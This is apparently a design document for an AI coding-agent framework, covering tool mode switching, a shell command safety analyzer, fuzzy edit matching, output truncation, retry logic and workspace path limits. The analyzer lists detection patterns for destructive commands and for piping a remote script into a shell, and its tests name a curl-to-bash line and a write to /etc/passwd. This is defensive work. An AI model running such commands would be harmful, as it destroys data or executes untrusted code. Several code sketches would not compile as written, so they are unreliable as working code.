# P1 Development Design Document

> Version: 1.0 | Branch: vidingcode | Date: 2026-03-06

This document provides implementation-level guidance for all 7 P1 items. Each section is self-contained.

---

## P1-6: Agent Mode Switching (Plan/Build)

### Problem

No concept of execution modes. All agents have full access to all configured tools. Users cannot restrict an agent to read-only analysis mode without creating a separate agent instance.

### Current State

- `BuiltinTools` defines tool groups: `ALL`, `FILE_OPERATIONS`, `FILE_READ_ONLY`, etc.
- `AgentHelper.toReqTools()` filters tools by `isLlmVisible()` before sending to LLM
- No runtime mode concept exists

### Design

#### 6.1 AgentMode enum

```java
package ai.core.agent;

public enum AgentMode {
    BUILD,  // full access: all tools allowed
    PLAN    // read-only: deny write/shell tools, only allow read/search/web
}
```

#### 6.2 Mode-based tool filtering in Agent

Add mode field to Agent and filter tools at runtime in `chatTurns`:

```java
// In Agent.java
AgentMode mode = AgentMode.BUILD;

public void setMode(AgentMode mode) {
    this.mode = mode;
}

public AgentMode getMode() {
    return mode;
}
```

Modify `AgentHelper.toReqTools()` to accept mode:

```java
public static List<Tool> toReqTools(List<ToolCall> toolCalls, AgentMode mode) {
    return toolCalls.stream()
        .filter(ToolCall::isLlmVisible)
        .filter(t -> mode == AgentMode.BUILD || isReadOnlyTool(t))
        .map(ToolCall::toTool)
        .toList();
}

private static final Set<String> WRITE_TOOLS = Set.of(
    "write_file", "edit_file", "run_bash_command", "run_python_script"
);

private static boolean isReadOnlyTool(ToolCall tool) {
    return !WRITE_TOOLS.contains(tool.getName());
}
```

#### 6.3 ToolExecutor enforcement

Even if LLM somehow calls a write tool in plan mode, enforce at execution:

```java
// In ToolExecutor.doExecute(), before tool lookup:
if (agentMode == AgentMode.PLAN && WRITE_TOOLS.contains(functionCall.function.name)) {
    return ToolCallResult.failed(
        "Tool '" + functionCall.function.name + "' is not available in Plan mode. "
        + "Switch to Build mode to execute write operations.");
}
```

#### 6.4 CLI integration

Add `/mode` slash command to `AgentSessionRunner.dispatchCommand()`:

```java
} else if (lower.startsWith("/mode")) {
    handleModeSwitch();
}

private void handleModeSwitch() {
    var current = agent.getMode();
    var next = current == AgentMode.BUILD ? AgentMode.PLAN : AgentMode.BUILD;
    agent.setMode(next);
    ui.printStreamingChunk("\n  " + AnsiTheme.SUCCESS + "✓" + AnsiTheme.RESET
        + " Mode: " + current + " → " + AnsiTheme.PROMPT + next + AnsiTheme.RESET + "\n\n");
}
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../agent/AgentMode.java` | **New** — enum with BUILD/PLAN |
| `core-ai/src/.../agent/Agent.java` | Add `mode` field, pass to `toReqTools()` |
| `core-ai/src/.../agent/internal/AgentHelper.java` | Add mode filter to `toReqTools()` |
| `core-ai/src/.../tool/ToolExecutor.java` | Enforce mode at execution level |
| `core-ai-cli/src/.../agent/AgentSessionRunner.java` | Add `/mode` command |

### Verification

1. Start in BUILD mode → all tools available
2. Switch to PLAN → LLM only sees read tools
3. In PLAN mode, LLM tries to call `write_file` → denied with message
4. Switch back to BUILD → write tools available again

---

## P1-7: Shell Command Security Analysis

### Problem

`ShellCommandTool` executes arbitrary commands with no safety checks. No detection of destructive commands like `rm -rf /`, `dd`, `mkfs`, or pipe injections.

### Current State

- `ShellCommandTool.exec()` directly passes commands to `ProcessBuilder`
- Only validation: workspace directory exists and timeout enforcement
- No command content analysis

### Design

#### 7.1 Command safety analyzer

```java
package ai.core.tool.tools.security;

import java.util.List;
import java.util.regex.Pattern;

public class ShellCommandAnalyzer {

    public record AnalysisResult(RiskLevel level, String reason) {}

    public enum RiskLevel {
        SAFE,       // proceed without confirmation
        CAUTION,    // log warning but proceed
        DANGEROUS   // require explicit approval
    }

    private static final List<DangerPattern> DANGER_PATTERNS = List.of(
        new DangerPattern(Pattern.compile("rm\\s+(-[a-zA-Z]*f[a-zA-Z]*\\s+|--force)"), "force delete files"),
        new DangerPattern(Pattern.compile("rm\\s+-[a-zA-Z]*r[a-zA-Z]*\\s+/"), "recursive delete from root"),
        new DangerPattern(Pattern.compile(">(\\s*/dev/sd|\\s*/dev/nvme|\\s*/dev/disk)"), "write to raw device"),
        new DangerPattern(Pattern.compile("mkfs\\."), "format filesystem"),
        new DangerPattern(Pattern.compile("dd\\s+.*of=/dev/"), "raw disk write"),
        new DangerPattern(Pattern.compile(":(\\){0}\\s*>\\s*/)"), "truncate system files"),
        new DangerPattern(Pattern.compile("chmod\\s+-R\\s+777\\s+/"), "open permissions on root"),
        new DangerPattern(Pattern.compile("curl\\s+.*\\|\\s*(sh|bash)"), "pipe remote script to shell"),
        new DangerPattern(Pattern.compile("wget\\s+.*\\|\\s*(sh|bash)"), "pipe remote script to shell"),
        new DangerPattern(Pattern.compile("\\bsudo\\b"), "elevated privileges"),
        new DangerPattern(Pattern.compile("git\\s+push\\s+.*--force"), "force push"),
        new DangerPattern(Pattern.compile("git\\s+reset\\s+--hard"), "hard reset"),
        new DangerPattern(Pattern.compile("DROP\\s+(TABLE|DATABASE)", Pattern.CASE_INSENSITIVE), "database destructive operation")
    );

    private static final List<DangerPattern> CAUTION_PATTERNS = List.of(
        new DangerPattern(Pattern.compile("rm\\s"), "file deletion"),
        new DangerPattern(Pattern.compile("mv\\s+.*\\s+/dev/null"), "move to null"),
        new DangerPattern(Pattern.compile("kill\\s+-9"), "force kill process"),
        new DangerPattern(Pattern.compile("pkill\\s"), "kill processes by pattern")
    );

    public static AnalysisResult analyze(String command) {
        if (command == null || command.isBlank()) {
            return new AnalysisResult(RiskLevel.SAFE, null);
        }

        for (var pattern : DANGER_PATTERNS) {
            if (pattern.pattern.matcher(command).find()) {
                return new AnalysisResult(RiskLevel.DANGEROUS, pattern.description);
            }
        }

        for (var pattern : CAUTION_PATTERNS) {
            if (pattern.pattern.matcher(command).find()) {
                return new AnalysisResult(RiskLevel.CAUTION, pattern.description);
            }
        }

        return new AnalysisResult(RiskLevel.SAFE, null);
    }

    private record DangerPattern(Pattern pattern, String description) {
        DangerPattern(Pattern pattern, String description) {
            this.pattern = pattern;
            this.description = description;
        }
        DangerPattern(java.util.regex.Pattern compiled, String description) {
            this.pattern = compiled;
            this.description = description;
        }
    }
}
```

#### 7.2 Integration in ShellCommandTool

Add analysis before execution in `doExecute()`:

```java
private ToolCallResult doExecute(String text) {
    // ... parse args ...

    if (!Strings.isBlank(command)) {
        var analysis = ShellCommandAnalyzer.analyze(command);
        if (analysis.level() == ShellCommandAnalyzer.RiskLevel.DANGEROUS) {
            return ToolCallResult.failed(
                "Command blocked for safety: " + analysis.reason()
                + ". Command: " + command
                + "\nIf this is intentional, ask the user to approve this specific operation.");
        }
        if (analysis.level() == ShellCommandAnalyzer.RiskLevel.CAUTION) {
            LOGGER.warn("Caution: shell command flagged as '{}': {}", analysis.reason(), command);
        }
    }

    // ... existing execution logic ...
}
```

#### 7.3 Configurable strictness

```java
// In ShellCommandTool.Builder
private boolean strictMode = true;

public Builder strictMode(boolean strict) {
    this.strictMode = strict;
    return this;
}
```

When `strictMode=false`, DANGEROUS commands log a warning instead of blocking.

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../tool/tools/security/ShellCommandAnalyzer.java` | **New** — pattern-based command analysis |
| `core-ai/src/.../tool/tools/ShellCommandTool.java` | Integrate analysis before execution |

### Verification

1. `rm -rf /tmp/test` → DANGEROUS, blocked
2. `ls -la` → SAFE, pass
3. `curl http://example.com | bash` → DANGEROUS, blocked
4. `rm file.txt` → CAUTION, logged but allowed
5. `git push --force` → DANGEROUS, blocked

---

## P1-8: EditFileTool Fuzzy Matching

### Problem

`EditFileTool` uses exact `String.contains()` matching (line 123). If the LLM produces `old_string` with minor whitespace or indentation differences from the actual file content, the edit fails with "old_string not found".

### Current State

- Line 120-121: only `normalizeLineEndings()` applied (CRLF ↔ LF)
- Line 123: exact `content.contains(normalizedOld)` check
- No fuzzy matching at all

### Design

#### 8.1 Multi-strategy fuzzy matcher

```java
package ai.core.tool.tools.edit;

import java.util.List;

public class FuzzyMatcher {

    public record MatchResult(String matchedText, String strategyName) {}

    // Strategies ordered from strictest to most lenient
    private static final List<MatchStrategy> STRATEGIES = List.of(
        new ExactStrategy(),
        new TrimmedLinesStrategy(),
        new WhitespaceNormalizedStrategy(),
        new IndentationFlexibleStrategy(),
        new LevenshteinStrategy()
    );

    public static MatchResult findMatch(String content, String target) {
        for (var strategy : STRATEGIES) {
            var result = strategy.find(content, target);
            if (result != null) return result;
        }
        return null;
    }

    interface MatchStrategy {
        MatchResult find(String content, String target);
    }

    // Strategy 1: exact match (current behavior)
    static class ExactStrategy implements MatchStrategy {
        public MatchResult find(String content, String target) {
            if (content.contains(target)) {
                return new MatchResult(target, "exact");
            }
            return null;
        }
    }

    // Strategy 2: trim each line before matching
    static class TrimmedLinesStrategy implements MatchStrategy {
        public MatchResult find(String content, String target) {
            var trimmedTarget = trimLines(target);
            var trimmedContent = trimLines(content);
            int idx = trimmedContent.indexOf(trimmedTarget);
            if (idx < 0) return null;
            // Map back to original content
            var original = extractOriginalBlock(content, trimmedContent, trimmedTarget, idx);
            return original != null ? new MatchResult(original, "trimmed-lines") : null;
        }

        private String trimLines(String text) {
            return text.lines().map(String::strip).collect(java.util.stream.Collectors.joining("\n"));
        }

        private String extractOriginalBlock(String content, String trimmedContent,
                String trimmedTarget, int trimmedIdx) {
            // Count newlines in trimmed content before match to find start line
            int startLine = (int) trimmedContent.substring(0, trimmedIdx).chars()
                .filter(c -> c == '\n').count();
            int targetLines = (int) trimmedTarget.chars().filter(c -> c == '\n').count() + 1;

            String[] lines = content.split("\n", -1);
            if (startLine + targetLines > lines.length) return null;

            var sb = new StringBuilder();
            for (int i = startLine; i < startLine + targetLines; i++) {
                if (i > startLine) sb.append('\n');
                sb.append(lines[i]);
            }
            return sb.toString();
        }
    }

    // Strategy 3: collapse all whitespace to single space
    static class WhitespaceNormalizedStrategy implements MatchStrategy {
        public MatchResult find(String content, String target) {
            var normTarget = normalize(target);
            var normContent = normalize(content);
            int idx = normContent.indexOf(normTarget);
            if (idx < 0) return null;
            // Find the original region using character mapping
            var original = mapBackToOriginal(content, normContent, normTarget, idx);
            return original != null ? new MatchResult(original, "whitespace-normalized") : null;
        }

        private String normalize(String text) {
            return text.replaceAll("[ \\t]+", " ").strip();
        }

        private String mapBackToOriginal(String original, String normalized,
                String normTarget, int normIdx) {
            // Build index mapping from normalized to original positions
            int origIdx = 0;
            int normPos = 0;
            int startOrig = -1;
            int endOrig = -1;
            String normOrig = normalize(original);

            // Simple approach: find by line count
            int startLine = (int) normalized.substring(0, normIdx).chars()
                .filter(c -> c == '\n').count();
            int targetLines = (int) normTarget.chars().filter(c -> c == '\n').count() + 1;
            String[] lines = original.split("\n", -1);
            if (startLine + targetLines > lines.length) return null;
            var sb = new StringBuilder();
            for (int i = startLine; i < startLine + targetLines; i++) {
                if (i > startLine) sb.append('\n');
                sb.append(lines[i]);
            }
            return sb.toString();
        }
    }

    // Strategy 4: ignore leading indentation differences
    static class IndentationFlexibleStrategy implements MatchStrategy {
        public MatchResult find(String content, String target) {
            String[] targetLines = target.split("\n", -1);
            String[] contentLines = content.split("\n", -1);
            if (targetLines.length == 0) return null;

            String firstTargetStripped = targetLines[0].stripLeading();

            for (int i = 0; i <= contentLines.length - targetLines.length; i++) {
                if (!contentLines[i].stripLeading().equals(firstTargetStripped)) continue;

                // Calculate indent delta
                int contentIndent = leadingSpaces(contentLines[i]);
                int targetIndent = leadingSpaces(targetLines[0]);
                int delta = contentIndent - targetIndent;

                boolean match = true;
                for (int j = 0; j < targetLines.length; j++) {
                    String expected = adjustIndent(targetLines[j], delta);
                    if (!contentLines[i + j].equals(expected)) {
                        match = false;
                        break;
                    }
                }

                if (match) {
                    var sb = new StringBuilder();
                    for (int j = 0; j < targetLines.length; j++) {
                        if (j > 0) sb.append('\n');
                        sb.append(contentLines[i + j]);
                    }
                    return new MatchResult(sb.toString(), "indentation-flexible");
                }
            }
            return null;
        }

        private int leadingSpaces(String line) {
            int count = 0;
            for (char c : line.toCharArray()) {
                if (c == ' ') count++;
                else if (c == '\t') count += 4;
                else break;
            }
            return count;
        }

        private String adjustIndent(String line, int delta) {
            if (delta == 0) return line;
            String stripped = line.stripLeading();
            int origSpaces = leadingSpaces(line);
            int newSpaces = Math.max(0, origSpaces + delta);
            return " ".repeat(newSpaces) + stripped;
        }
    }

    // Strategy 5: Levenshtein distance for small edits (last resort)
    static class LevenshteinStrategy implements MatchStrategy {
        private static final double MAX_DISTANCE_RATIO = 0.05; // max 5% difference

        public MatchResult find(String content, String target) {
            if (target.length() > 500) return null; // skip for large blocks

            String[] contentLines = content.split("\n", -1);
            String[] targetLines = target.split("\n", -1);
            int targetLen = targetLines.length;

            double bestRatio = Double.MAX_VALUE;
            int bestStart = -1;

            for (int i = 0; i <= contentLines.length - targetLen; i++) {
                var candidate = new StringBuilder();
                for (int j = 0; j < targetLen; j++) {
                    if (j > 0) candidate.append('\n');
                    candidate.append(contentLines[i + j]);
                }
                int dist = levenshteinDistance(candidate.toString(), target);
                double ratio = (double) dist / Math.max(target.length(), 1);
                if (ratio < bestRatio) {
                    bestRatio = ratio;
                    bestStart = i;
                }
            }

            if (bestRatio > MAX_DISTANCE_RATIO || bestStart < 0) return null;

            var sb = new StringBuilder();
            for (int j = 0; j < targetLen; j++) {
                if (j > 0) sb.append('\n');
                sb.append(contentLines[bestStart + j]);
            }
            return new MatchResult(sb.toString(), "levenshtein(" + String.format("%.1f%%", bestRatio * 100) + ")");
        }

        private int levenshteinDistance(String a, String b) {
            int[] prev = new int[b.length() + 1];
            int[] curr = new int[b.length() + 1];
            for (int j = 0; j <= b.length(); j++) prev[j] = j;
            for (int i = 1; i <= a.length(); i++) {
                curr[0] = i;
                for (int j = 1; j <= b.length(); j++) {
                    int cost = a.charAt(i - 1) == b.charAt(j - 1) ? 0 : 1;
                    curr[j] = Math.min(Math.min(curr[j - 1] + 1, prev[j] + 1), prev[j - 1] + cost);
                }
                var tmp = prev; prev = curr; curr = tmp;
            }
            return prev[b.length()];
        }
    }
}
```

#### 8.2 Integration in EditFileTool

Replace the exact match logic in `editFile()`:

```java
private String editFile(String filePath, String oldString, String newString, Boolean replaceAll) {
    // ... existing validation and file reading ...

    var normalizedOld = normalizeLineEndings(oldString, content);
    var normalizedNew = normalizeLineEndings(newString, content);

    // Try fuzzy matching
    var match = FuzzyMatcher.findMatch(content, normalizedOld);
    if (match == null) {
        return "Error: old_string not found in file. Make sure to copy the exact text including whitespace.";
    }

    // Use the actual matched text for replacement
    String actualOld = match.matchedText();
    int occurrences = countOccurrences(content, actualOld);
    if (!replaceAll && occurrences > 1) {
        return String.format("Error: matched text appears %d times. Provide more context or set replace_all=true.", occurrences);
    }

    if (!match.strategyName().equals("exact")) {
        LOGGER.info("Fuzzy match used strategy '{}' for edit in {}", match.strategyName(), filePath);
    }

    String newContent = content.replace(actualOld, normalizedNew);
    // ... existing write logic ...
}
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../tool/tools/edit/FuzzyMatcher.java` | **New** — multi-strategy fuzzy matcher |
| `core-ai/src/.../tool/tools/EditFileTool.java` | Replace exact match with `FuzzyMatcher.findMatch()` |

### Verification

1. Exact match → works as before
2. LLM adds extra trailing spaces → TrimmedLinesStrategy matches
3. LLM uses 2 spaces but file uses 4 → IndentationFlexibleStrategy matches
4. LLM has minor typo in whitespace → WhitespaceNormalizedStrategy matches
5. Very large blocks → LevenshteinStrategy skipped for performance

---

## P1-9: Tool Output Truncation System

### Problem

Current `Compression.compressToolResult()` handles tool results >64k tokens, but there is no early truncation at the tool output level for moderate-size results (e.g., shell output with 5000 lines). These bloat the context without triggering compression.

### Current State

- `CompressionLifecycle.afterTool()` calls `compression.compressToolResult()` for results >64k tokens
- `ShellCommandTool` description mentions "30000 characters" truncation, but no code enforces it
- No general-purpose truncation for moderate outputs

### Design

#### 9.1 ToolOutputTruncator utility

```java
package ai.core.tool;

public class ToolOutputTruncator {
    public static final int DEFAULT_MAX_LINES = 2000;
    public static final int DEFAULT_MAX_BYTES = 50_000;  // ~50KB

    public record TruncationResult(String output, boolean wasTruncated, int originalLines, int originalBytes) {}

    public static TruncationResult truncate(String output) {
        return truncate(output, DEFAULT_MAX_LINES, DEFAULT_MAX_BYTES);
    }

    public static TruncationResult truncate(String output, int maxLines, int maxBytes) {
        if (output == null || output.isEmpty()) {
            return new TruncationResult(output, false, 0, 0);
        }

        int originalBytes = output.length();
        String[] lines = output.split("\n", -1);
        int originalLines = lines.length;

        boolean truncatedByLines = lines.length > maxLines;
        boolean truncatedByBytes = originalBytes > maxBytes;

        if (!truncatedByLines && !truncatedByBytes) {
            return new TruncationResult(output, false, originalLines, originalBytes);
        }

        // Take first portion and last portion
        int headLines = Math.min(lines.length, maxLines * 3 / 4);  // 75% head
        int tailLines = Math.min(lines.length - headLines, maxLines / 4);  // 25% tail

        var sb = new StringBuilder();
        for (int i = 0; i < headLines; i++) {
            sb.append(lines[i]).append('\n');
        }

        sb.append("\n... [truncated ")
          .append(originalLines - headLines - tailLines)
          .append(" lines, total ")
          .append(originalLines)
          .append(" lines / ")
          .append(formatBytes(originalBytes))
          .append("] ...\n\n");

        if (tailLines > 0) {
            int tailStart = lines.length - tailLines;
            for (int i = tailStart; i < lines.length; i++) {
                sb.append(lines[i]).append('\n');
            }
        }

        // Final byte check
        String result = sb.toString();
        if (result.length() > maxBytes) {
            result = result.substring(0, maxBytes)
                + "\n... [output truncated at " + formatBytes(maxBytes) + "]";
        }

        return new TruncationResult(result, true, originalLines, originalBytes);
    }

    private static String formatBytes(int bytes) {
        if (bytes < 1024) return bytes + "B";
        return String.format("%.1fKB", bytes / 1024.0);
    }
}
```

#### 9.2 Integration in ToolExecutor

Apply truncation after tool execution but before lifecycle hooks:

```java
// In ToolExecutor.doExecute(), after executeWithTimeout():
var result = executeWithTimeout(tool, functionCall, context);

// Truncate large outputs before passing to lifecycle
if (result.isCompleted() && result.getResult() != null) {
    var truncated = ToolOutputTruncator.truncate(result.getResult());
    if (truncated.wasTruncated()) {
        result.withResult(truncated.output());
        result.withStats("truncated", true);
        result.withStats("original_lines", truncated.originalLines());
        result.withStats("original_bytes", truncated.originalBytes());
        LOGGER.info("Tool output truncated: {} → {} lines, {} → {} bytes",
            truncated.originalLines(), truncated.output().split("\n").length,
            truncated.originalBytes(), truncated.output().length());
    }
}
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../tool/ToolOutputTruncator.java` | **New** — line/byte truncation utility |
| `core-ai/src/.../tool/ToolExecutor.java` | Apply truncation after tool execution |

### Verification

1. Tool returns 100 lines → no truncation
2. Tool returns 5000 lines → truncated to ~2000 lines with head/tail split
3. Tool returns 100KB output → byte-limited to ~50KB
4. Stats include `truncated=true` and original size info

---

## P1-10: Error Recovery and Retry

### Problem

LLM API failures (rate limits, network errors, server errors) crash the agent with no recovery. The existing `LiteLLMProvider` has `MAX_RETRIES=3` but this is only for SSE connection retries, not for the overall completion call or other error types.

### Current State

- `LLMProvider.completionStream()` — no try/catch, exceptions propagate to `Agent.aroundLLM()` → crashes
- `LiteLLMProvider`: has retry logic for SSE stream connection only (lines 39-40)
- No distinction between retryable vs non-retryable errors
- No context overflow detection

### Design

#### 10.1 Retryable error classification

```java
package ai.core.llm;

public class LLMErrorClassifier {

    public enum ErrorAction {
        RETRY,              // transient error, retry with backoff
        COMPRESS_AND_RETRY, // context too large, compress then retry
        FAIL                // permanent error, stop
    }

    public static ErrorAction classify(Exception e) {
        String msg = e.getMessage() != null ? e.getMessage().toLowerCase() : "";

        // Context overflow
        if (msg.contains("context_length_exceeded") || msg.contains("max_tokens")
            || msg.contains("context window") || msg.contains("too many tokens")) {
            return ErrorAction.COMPRESS_AND_RETRY;
        }

        // Rate limit
        if (msg.contains("rate_limit") || msg.contains("429") || msg.contains("too many requests")) {
            return ErrorAction.RETRY;
        }

        // Server errors
        if (msg.contains("500") || msg.contains("502") || msg.contains("503")
            || msg.contains("server_error") || msg.contains("internal error")) {
            return ErrorAction.RETRY;
        }

        // Network errors
        if (e instanceof java.net.SocketTimeoutException
            || e instanceof java.net.ConnectException
            || msg.contains("connection") || msg.contains("timeout")) {
            return ErrorAction.RETRY;
        }

        return ErrorAction.FAIL;
    }
}
```

#### 10.2 Retry wrapper in Agent.aroundLLM()

```java
// In Agent.java, replace aroundLLM():
private Choice aroundLLM(Function<CompletionRequest, CompletionResponse> func, CompletionRequest request) {
    agentLifecycles.forEach(alc -> alc.beforeModel(request, getExecutionContext()));

    CompletionResponse resp = null;
    int maxRetries = 3;
    long baseDelayMs = 2000;

    for (int attempt = 0; attempt <= maxRetries; attempt++) {
        try {
            resp = func.apply(request);
            break; // success
        } catch (Exception e) {
            var action = LLMErrorClassifier.classify(e);
            logger.warn("LLM call failed (attempt {}/{}): action={}, error={}",
                attempt + 1, maxRetries + 1, action, e.getMessage());

            if (action == LLMErrorClassifier.ErrorAction.FAIL || attempt == maxRetries) {
                throw e;
            }

            if (action == LLMErrorClassifier.ErrorAction.COMPRESS_AND_RETRY) {
                // Force compression
                List<Message> compressed = compression.compress(request.messages);
                request.messages.clear();
                request.messages.addAll(compressed);
                logger.info("Context compressed due to overflow, retrying...");
                continue; // no delay for compression retry
            }

            // Exponential backoff for RETRY
            long delay = baseDelayMs * (1L << attempt);
            logger.info("Retrying in {}ms...", delay);
            try {
                Thread.sleep(delay);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                throw e;
            }
        }
    }

    addTokenCost(resp.usage);
    agentLifecycles.forEach(alc -> alc.afterModel(request, resp, getExecutionContext()));
    return resp.choices.getFirst();
}
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../llm/LLMErrorClassifier.java` | **New** — error classification |
| `core-ai/src/.../agent/Agent.java` | Add retry loop in `aroundLLM()` |

### Verification

1. Mock 429 error → retries 3 times with exponential backoff
2. Mock context overflow → triggers compression then retry
3. Mock authentication error → fails immediately
4. Mock network timeout → retries then succeeds

---

## P1-11: Deferred Tool Lazy Loading

### Problem

All tools are registered at build time and included in the system prompt. With many MCP tools, this bloats the prompt and wastes tokens. The existing `ToolActivationTool` already implements discovery for tools marked `discoverable=true`, but no tools are discoverable by default.

### Current State

- `ToolActivationTool` — fully functional search + activate mechanism (already implemented)
- `AgentBuilder.configureToolDiscovery()` — sets `llmVisible=false` for discoverable tools, adds `ToolActivationTool`
- `AgentBuilder.mcpServersDiscoverable()` — marks MCP tools as discoverable
- No built-in tools are marked discoverable, no auto-discoverable threshold

### Design

This is mostly about **enabling and extending** the existing mechanism, not building from scratch.

#### 11.1 Auto-discoverable threshold

When total tool count exceeds a threshold, automatically mark low-priority tools as discoverable:

```java
// In AgentBuilder.configureToolDiscovery():
private void configureToolDiscovery(Agent agent) {
    int totalTools = agent.toolCalls.size();

    // Auto-mark as discoverable when tool count is high
    if (totalTools > AUTO_DISCOVER_THRESHOLD) {
        for (var tool : agent.toolCalls) {
            if (isAutoDiscoverableCandidate(tool) && !tool.isDiscoverable()) {
                tool.setDiscoverable(true);
            }
        }
    }

    var discoverableTools = agent.toolCalls.stream().filter(ToolCall::isDiscoverable).toList();
    if (!discoverableTools.isEmpty()) {
        for (var tool : discoverableTools) {
            tool.setLlmVisible(false);
        }
        agent.toolCalls.add(ToolActivationTool.builder().allToolCalls(agent.toolCalls).build());
    }
}

private static final int AUTO_DISCOVER_THRESHOLD = 20;
private static final Set<String> CORE_TOOLS = Set.of(
    "read_file", "write_file", "edit_file", "glob_file", "grep_file",
    "run_bash_command", "write_todos", "activate_tools"
);

private boolean isAutoDiscoverableCandidate(ToolCall tool) {
    return !CORE_TOOLS.contains(tool.getName()) && !tool.isSubAgent();
}
```

#### 11.2 Builder API for explicit control

```java
// In AgentBuilder
private int autoDiscoverThreshold = 20;

public AgentBuilder autoDiscoverThreshold(int threshold) {
    this.autoDiscoverThreshold = threshold;
    return this;
}
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../agent/AgentBuilder.java` | Add auto-discover threshold logic in `configureToolDiscovery()` |

### Verification

1. Agent with 10 tools → no tools hidden, no `activate_tools`
2. Agent with 30 tools → non-core tools hidden, `activate_tools` added
3. LLM calls `activate_tools(query="database")` → finds relevant tools
4. LLM calls `activate_tools(tool_names=["mcp_db_query"])` → tool becomes visible
5. Explicit `mcpServersDiscoverable()` still works as before

---

## P1-12: External Directory Protection

### Problem

`ReadFileTool`, `WriteFileTool`, `EditFileTool`, and `ShellCommandTool` accept arbitrary absolute paths. No boundary checking exists — the LLM can read/write files outside the project workspace.

### Current State

- All file tools accept `file_path` as raw string, no validation
- `ShellCommandTool` accepts `workspace_dir` parameter, defaults to temp dir
- `CliAgent` builds system prompt with workspace info, but no enforcement
- No concept of "project root" or "allowed directories" in the tool layer

### Design

#### 12.1 Path boundary validator

```java
package ai.core.tool;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class PathBoundary {
    private final Path projectRoot;
    private final List<Path> allowedPaths;

    public PathBoundary(Path projectRoot) {
        this.projectRoot = projectRoot.toAbsolutePath().normalize();
        this.allowedPaths = new ArrayList<>();
        this.allowedPaths.add(this.projectRoot);
        // Always allow temp directories
        this.allowedPaths.add(Path.of(System.getProperty("java.io.tmpdir")).toAbsolutePath().normalize());
    }

    public void addAllowedPath(Path path) {
        allowedPaths.add(path.toAbsolutePath().normalize());
    }

    public boolean isAllowed(String filePath) {
        if (filePath == null || filePath.isBlank()) return false;
        Path normalized = Path.of(filePath).toAbsolutePath().normalize();
        return allowedPaths.stream().anyMatch(normalized::startsWith);
    }

    public String validate(String filePath) {
        if (isAllowed(filePath)) return null;
        return "Error: Path '" + filePath + "' is outside the project directory ("
            + projectRoot + "). For safety, file operations are restricted to the project workspace.";
    }

    public Path getProjectRoot() {
        return projectRoot;
    }
}
```

#### 12.2 Pass PathBoundary via ExecutionContext

```java
// In ExecutionContext.java — add field
private PathBoundary pathBoundary;

public PathBoundary getPathBoundary() {
    return pathBoundary;
}

// In ExecutionContext.Builder
private PathBoundary pathBoundary;

public Builder pathBoundary(PathBoundary pathBoundary) {
    this.pathBoundary = pathBoundary;
    return this;
}
```

#### 12.3 Integrate in file tools

Each file tool checks the path boundary before execution. Since file tools currently don't use `ExecutionContext`, upgrade them:

```java
// In WriteFileTool — override execute with context
@Override
public ToolCallResult execute(String text, ExecutionContext context) {
    var argsMap = JSON.fromJSON(Map.class, text);
    var filePath = (String) argsMap.get("file_path");

    if (context != null && context.getPathBoundary() != null) {
        var error = context.getPathBoundary().validate(filePath);
        if (error != null) return ToolCallResult.failed(error);
    }

    return execute(text);  // delegate to existing logic
}
```

Apply the same pattern to `ReadFileTool`, `EditFileTool`, `GlobFileTool`, `GrepFileTool`.

#### 12.4 ShellCommandTool workspace enforcement

```java
// In ShellCommandTool.doExecute(), after parsing args:
if (context != null && context.getPathBoundary() != null) {
    var boundary = context.getPathBoundary();
    // Default workspace to project root
    if (Strings.isBlank(workspaceDir)) {
        workspaceDir = boundary.getProjectRoot().toString();
    }
    // Validate workspace is within bounds
    var error = boundary.validate(workspaceDir);
    if (error != null) return ToolCallResult.failed(error);
}
```

#### 12.5 CLI integration

```java
// In CliAgent.of(), set path boundary in context:
// This happens implicitly when workspace is set as working directory.
// Pass to AgentBuilder:
var pathBoundary = new PathBoundary(config.workspace);
builder.executionContext(ExecutionContext.builder()
    .pathBoundary(pathBoundary)
    .build());
```

### Files to Modify

| File | Action |
|------|--------|
| `core-ai/src/.../tool/PathBoundary.java` | **New** — path validation utility |
| `core-ai/src/.../agent/ExecutionContext.java` | Add `pathBoundary` field |
| `core-ai/src/.../tool/tools/WriteFileTool.java` | Override `execute(args, context)` with path check |
| `core-ai/src/.../tool/tools/EditFileTool.java` | Override `execute(args, context)` with path check |
| `core-ai/src/.../tool/tools/ReadFileTool.java` | Add path check (warn, not block — read is lower risk) |
| `core-ai/src/.../tool/tools/ShellCommandTool.java` | Default workspace to project root, validate workspace |
| `core-ai-cli/src/.../agent/CliAgent.java` | Create and pass `PathBoundary` |

### Verification

1. Write to `/etc/passwd` → blocked with error message
2. Write to `{workspace}/src/file.java` → allowed
3. Write to `/tmp/test.txt` → allowed (temp dir whitelisted)
4. Shell command with `workspace_dir=/etc` → blocked
5. Shell command with no workspace_dir → defaults to project root
6. Read `/etc/hosts` → warning logged but allowed (read is lower risk)

---

## Implementation Order

```
1. P1-9  Tool Output Truncation    — standalone utility, low risk
2. P1-7  Shell Security Analysis   — standalone, no dependencies
3. P1-12 External Directory Protect — touches ExecutionContext, moderate
4. P1-8  EditFile Fuzzy Matching   — isolated to EditFileTool
5. P1-6  Agent Mode Switching      — touches Agent core + CLI
6. P1-11 Deferred Tool Loading     — extends existing mechanism
7. P1-10 Error Recovery & Retry    — modifies LLM call path, highest risk
```
